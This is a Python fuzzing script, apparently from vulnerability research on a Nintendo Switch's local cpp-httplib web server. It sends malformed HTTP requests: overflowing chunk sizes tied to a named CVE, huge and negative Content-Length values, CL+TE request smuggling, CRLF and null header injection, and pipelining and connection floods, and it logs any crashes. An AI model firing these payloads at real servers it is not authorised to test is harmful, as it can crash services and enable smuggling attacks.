#!/usr/bin/env python3
"""
Deep HTTP fuzzer for the Switch's cpp-httplib server.
Tests: chunked TE (CVE-2026-45352), POST bodies, pipelining,
method fuzzing, header injection, HTTP smuggling.

Usage:
    sudo python3 -Iu lp2p_http_deep_fuzz.py --iface wlp5s0
"""

import subprocess
import socket
import time
import json
import sys
import argparse
from pathlib import Path
from datetime import datetime, timezone

EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "lp2p_dhcp"
SWITCH_IP = "192.168.0.1"


def ping_alive():
    r = subprocess.run(["ping", "-c", "1", "-W", "2", SWITCH_IP],
                       capture_output=True)
    return r.returncode == 0


def raw_http(request_bytes, timeout=3):
    """Send raw bytes, return (response_bytes, status_line)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((SWITCH_IP, 80))
        sock.sendall(request_bytes)
        data = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except socket.timeout:
                break
        status = data.split(b"\r\n")[0].decode("ascii", errors="replace") if data else "NO_RESPONSE"
        return data, status
    except Exception as e:
        return b"", f"ERROR: {e}"
    finally:
        sock.close()


def test(label, request_bytes, delay=1.5):
    """Run one test with ping check."""
    if not ping_alive():
        print(f"  [SKIP] {label} — unreachable")
        return {"label": label, "status": "unreachable"}

    print(f"  [{label}] ", end="", flush=True)
    data, status = raw_http(request_bytes)

    time.sleep(0.5)
    alive = ping_alive()

    entry = {
        "label": label,
        "resp_len": len(data),
        "status_line": status,
        "alive": alive,
    }

    if not alive:
        print(f"→ CRASH! ({status})")
        time.sleep(20)
        entry["recovered"] = ping_alive()
        if not entry["recovered"]:
            print(f"      *** CONFIRMED DOWN ***")
    else:
        s = status.split(" ", 2)
        code = s[1] if len(s) > 1 else "?"
        print(f"→ {code} ({len(data)}B)")

    time.sleep(delay)
    return entry


def chunked_request(path, chunks, method="POST"):
    """Build a chunked Transfer-Encoding request."""
    body = b""
    for chunk_data in chunks:
        if isinstance(chunk_data, int):
            # Negative or huge chunk size (the CVE-2026-45352 vector)
            body += f"{chunk_data:x}\r\n".encode()
            body += b"A" * abs(chunk_data) + b"\r\n"
        elif isinstance(chunk_data, str):
            # Raw chunk size string (can be negative hex etc.)
            body += f"{chunk_data}\r\n".encode()
            body += b"A" * 16 + b"\r\n"
        else:
            body += f"{len(chunk_data):x}\r\n".encode()
            body += chunk_data + b"\r\n"
    body += b"0\r\n\r\n"

    req = (
        f"{method} /{path} HTTP/1.1\r\n"
        f"Host: {SWITCH_IP}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode() + body
    return req


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", required=True)
    args = parser.parse_args()

    print("=" * 60)
    print("  lp2p HTTP Deep Fuzzer")
    print("=" * 60)
    print(f"  Target: {SWITCH_IP}")
    print(f"  Library: cpp-httplib (confirmed)")
    print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
    print("=" * 60)

    if not ping_alive():
        print("[!] Switch not reachable")
        sys.exit(1)
    print("[+] Switch alive\n")

    results = []
    crashed = False

    def run(label, req_bytes, delay=1.5):
        nonlocal crashed
        if crashed:
            return
        r = test(label, req_bytes, delay)
        results.append(r)
        if not r.get("alive", True):
            crashed = True

    # === Group 1: HTTP Methods ===
    print("--- Group 1: HTTP Methods ---")
    for method in ["GET", "POST", "PUT", "DELETE", "OPTIONS", "HEAD", "PATCH"]:
        req = f"{method} /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\nConnection: close\r\n\r\n".encode()
        run(f"{method} /data.json", req)

    # === Group 2: POST with bodies ===
    if not crashed:
        print("\n--- Group 2: POST with Content-Length bodies ---")
        for size in [0, 100, 1024, 4096, 65536]:
            body = b"A" * size
            req = (
                f"POST /data.json HTTP/1.1\r\n"
                f"Host: {SWITCH_IP}\r\n"
                f"Content-Length: {size}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode() + body
            run(f"POST body={size}B", req)

    # Content-Length mismatch (send less than declared)
    if not crashed:
        print("\n--- Group 3: Content-Length mismatches ---")
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Content-Length: 1000000\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + b"A" * 100  # Send only 100 bytes
        run("CL=1M send=100B", req)

        # Negative Content-Length
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Content-Length: -1\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + b"A" * 100
        run("CL=-1", req)

        # Content-Length: UINT64_MAX
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Content-Length: 18446744073709551615\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + b"A" * 100
        run("CL=UINT64_MAX", req)

        # Content-Length: SSIZE_MAX+1
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Content-Length: 9223372036854775808\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + b"A" * 100
        run("CL=SMAX+1", req)

    # === Group 4: Chunked Transfer-Encoding (CVE-2026-45352 vector) ===
    if not crashed:
        print("\n--- Group 4: Chunked Transfer-Encoding ---")

        # Normal chunked
        run("chunked normal", chunked_request("data.json", [b"hello world"]))

        # Multiple chunks
        run("chunked multi", chunked_request("data.json", [b"A"*100, b"B"*100, b"C"*100]))

        # Large chunk
        run("chunked 64KB", chunked_request("data.json", [b"A"*65536]))

        # Negative chunk size (CVE-2026-45352 vector)
        # -1 in hex = "ffffffffffffffff" (wraps to huge unsigned)
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"ffffffffffffffff\r\n"
            f"AAAA\r\n"
            f"0\r\n\r\n"
        ).encode()
        run("chunked neg -1 (0xFFFF...)", req)

        # -2
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"fffffffffffffffe\r\n"
            f"AAAA\r\n"
            f"0\r\n\r\n"
        ).encode()
        run("chunked neg -2 (0xFFFE...)", req)

        # 7fffffffffffffff (SSIZE_MAX)
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"7fffffffffffffff\r\n"
            f"AAAA\r\n"
            f"0\r\n\r\n"
        ).encode()
        run("chunked SMAX hex", req)

        # 8000000000000000 (SSIZE_MAX+1)
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"8000000000000000\r\n"
            f"AAAA\r\n"
            f"0\r\n\r\n"
        ).encode()
        run("chunked SMAX+1 hex", req)

        # Zero-length chunk followed by data (parsing confusion)
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"0\r\n"
            f"a\r\n"
            f"extra data\r\n"
            f"0\r\n\r\n"
        ).encode()
        run("chunked 0+extra", req)

    # === Group 5: HTTP Request Smuggling ===
    if not crashed:
        print("\n--- Group 5: Request smuggling ---")
        # CL + TE
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Content-Length: 5\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
            f"0\r\n\r\nGET /styles/index.css HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n"
        ).encode()
        run("CL+TE smuggle", req)

        # Double Content-Length
        req = (
            f"POST /data.json HTTP/1.1\r\n"
            f"Host: {SWITCH_IP}\r\n"
            f"Content-Length: 5\r\n"
            f"Content-Length: 100\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + b"A" * 100
        run("double CL", req)

    # === Group 6: Header injection ===
    if not crashed:
        print("\n--- Group 6: Header/line injection ---")
        # CRLF injection in URL
        req = f"GET /data.json%0d%0aInjected:header HTTP/1.1\r\nHost: {SWITCH_IP}\r\nConnection: close\r\n\r\n".encode()
        run("CRLF in URL", req)

        # Null in header value
        req = f"GET /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\nX-Test: foo\x00bar\r\nConnection: close\r\n\r\n".encode()
        run("null in header", req)

        # Very long single header line (no CRLF)
        req = f"GET /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\nX-Long: {'A' * 65536}\r\nConnection: close\r\n\r\n".encode()
        run("header 64KB", req)

        # Header without colon
        req = f"GET /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\nNotAHeader\r\nConnection: close\r\n\r\n".encode()
        run("header no colon", req)

    # === Group 7: HTTP Pipelining ===
    if not crashed:
        print("\n--- Group 7: Pipelining ---")
        # 10 pipelined requests
        req = b""
        for _ in range(10):
            req += f"GET /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n".encode()
        run("10 pipelined", req)

        # 100 pipelined requests
        req = b""
        for _ in range(100):
            req += f"GET /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\n\r\n".encode()
        run("100 pipelined", req)

    # === Group 8: Concurrent connections ===
    if not crashed:
        print("\n--- Group 8: Connection stress ---")
        import threading
        crash_flag = [False]

        def flood_connection(n):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((SWITCH_IP, 80))
                req = f"GET /data.json HTTP/1.1\r\nHost: {SWITCH_IP}\r\nConnection: keep-alive\r\n\r\n".encode()
                s.sendall(req)
                s.recv(4096)
                time.sleep(2)
                s.close()
            except:
                pass

        # 20 concurrent connections
        threads = []
        for i in range(20):
            t = threading.Thread(target=flood_connection, args=(i,))
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=10)
        time.sleep(1)
        alive = ping_alive()
        print(f"  [20 concurrent] alive={alive}")
        results.append({"label": "20_concurrent", "alive": alive})
        if not alive:
            crashed = True

    # === Group 9: Oversized request line ===
    if not crashed:
        print("\n--- Group 9: Oversized request components ---")
        # Very long query string
        req = f"GET /data.json?{'A' * 8192} HTTP/1.1\r\nHost: {SWITCH_IP}\r\nConnection: close\r\n\r\n".encode()
        run("query 8KB", req)

        # Many query parameters
        params = "&".join(f"p{i}={'A'*100}" for i in range(100))
        req = f"GET /data.json?{params} HTTP/1.1\r\nHost: {SWITCH_IP}\r\nConnection: close\r\n\r\n".encode()
        run("100 query params", req)

        # Fragment in URL
        req = f"GET /data.json#{'A' * 1024} HTTP/1.1\r\nHost: {SWITCH_IP}\r\nConnection: close\r\n\r\n".encode()
        run("fragment 1KB", req)

    # Save evidence
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    path = EVIDENCE_DIR / "deep_fuzz_results.json"
    with open(path, "w") as f:
        json.dump({
            "test": "http_deep_fuzz",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "library": "cpp-httplib",
            "results": results,
            "crashed": crashed,
        }, f, indent=2, default=str)
    print(f"\nEvidence saved: {path}")

    # Summary
    print("\n" + "=" * 60)
    crashes = [r for r in results if not r.get("alive", True)]
    if crashes:
        print(f"  CRASHES: {len(crashes)}")
        for c in crashes:
            print(f"    {c['label']}")
    else:
        print(f"  No crashes in {len(results)} tests")
    print("=" * 60)


if __name__ == "__main__":
    main()
